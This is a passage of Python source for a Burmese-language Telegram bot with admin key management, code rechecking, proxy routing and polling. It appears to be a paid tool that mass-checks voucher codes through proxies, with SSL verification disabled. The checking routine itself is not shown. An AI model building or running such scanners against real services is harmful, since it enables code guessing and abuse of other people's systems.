    current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
    notify_setting[chat_id] = not current
    state = "ON ✅" if notify_setting[chat_id] else "OFF ❌"
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        code   = item["code"]
        recode = await perform_check(
            user_data[chat_id]['session_url'], code, chat_id,
            recheck=True, message=message
        )
        if recode:
            new_success.append(item)
    if new_success:
        success_texts[chat_id] = new_success
        codes_str = "\n".join([f"`{i['code']}` – ⏳ {i.get('plan','N/A')}" for i in new_success])
        await bot.reply_to(message, f"✅ Rechecked Codes ({len(new_success)}):\n{codes_str}",
                           parse_mode="Markdown")
    else:
        success_texts[chat_id] = []
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans   = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds  = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n`/genkey 1h30m 123456789`\n`/genkey unlimited 123456789`",
                           parse_mode="Markdown")
        return
    plan    = args[1]
    user_id = args[2]
    expiry  = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Duration ပုံစံမမှန်ပါ။ ဥပမာ: 30m, 1h, 2d, 1h30m, unlimited")
        return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
    await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID : `{user_id}`\nPLAN : {plan}\nEXPIRES : {expiry}",
                       parse_mode="Markdown")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n`/delkey 123456789`", parse_mode="Markdown")
        return
    user_id = args[1]
    auth_list, sha = await get_file_content("auth_list.json")
    if user_id not in auth_list:
        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
        return
    del auth_list[user_id]
    await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
    approve.pop(int(user_id), None)
    user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : `{user_id}`", parse_mode="Markdown")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan    = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now    = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff    = exp_dt - now
                            days    = diff.days
                            hours2, rem = divmod(diff.seconds, 3600)
                            minutes2    = rem // 60
                            expires_str = f"{days}d {hours2}h {minutes2}m left"
                    except Exception:
                        expires_str = expires
            else:
                plan        = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        logger.error(f"Error at listkeys {e}")

# ── Connector factory (proxy-aware) ──────────────────────────────────────
def create_connector():
    """
    PROXY_URL ရှိရင် ProxyConnector, မရှိရင် TCPConnector ပြန်ပေးသည်။
    ထောက်ပံ့သောပုံစံများ:
      http://host:port
      http://user:pass@host:port
      socks4://host:port
      socks5://user:pass@host:port
    """
    if PROXY_URL:
        try:
            conn = ProxyConnector.from_url(
                PROXY_URL,
                limit=1000,
                ssl=False,
                rdns=True,      # DNS ကို proxy ဘက်မှာ resolve (SOCKS5 အတွက် အကောင်းဆုံး)
            )
            logger.info(f"🔒 Proxy connector created: {PROXY_URL}")
            return conn
        except Exception as e:
            logger.error(f"❌ Proxy setup failed ({e}) — falling back to direct connection.")
    return aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)

# ── Polling with auto-reconnect ───────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            logger.info("🤖 Bot polling started...")
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return  # normal exit
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.warning(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            logger.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ── Main entry point ──────────────────────────────────────────────────────
async def main():
    global session, _connector, _voucher_sem

    # Initialize semaphore inside the running event loop
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    timeout     = aiohttp.ClientTimeout(total=30)
    _connector  = create_connector()
    session     = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)

    logger.info("🚀 Bot starting up...")
    if PROXY_URL:
        logger.info(f"🔒 All requests routed through proxy: {PROXY_URL}")
    else:
        logger.info("🌐 Direct connection (no proxy)")

    loop = asyncio.get_running_loop()

    # Graceful shutdown on SIGTERM (Railway sends SIGTERM on restart/stop)
    stop_event = asyncio.Event()

    def _handle_sigterm():
        logger.info("⚠️ SIGTERM received. Shutting down gracefully...")
        stop_event.set()

    try:
        loop.add_signal_handler(signal.SIGTERM, _handle_sigterm)
        loop.add_signal_handler(signal.SIGINT,  _handle_sigterm)
    except NotImplementedError:
        pass  # Windows does not support add_signal_handler

    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())

        polling_task = asyncio.create_task(start_polling())

        # Wait until stop signal or polling finishes
        done, pending = await asyncio.wait(
            [polling_task, asyncio.create_task(stop_event.wait())],
            return_when=asyncio.FIRST_COMPLETED
        )
        for task in pending:
            task.cancel()
    finally:
        logger.info("🛑 Closing sessions...")
        await session.close()
        await _connector.close()
        logger.info("✅ Shutdown complete.")

if __name__ == '__main__':
    validate_env()
    asyncio.run(main())
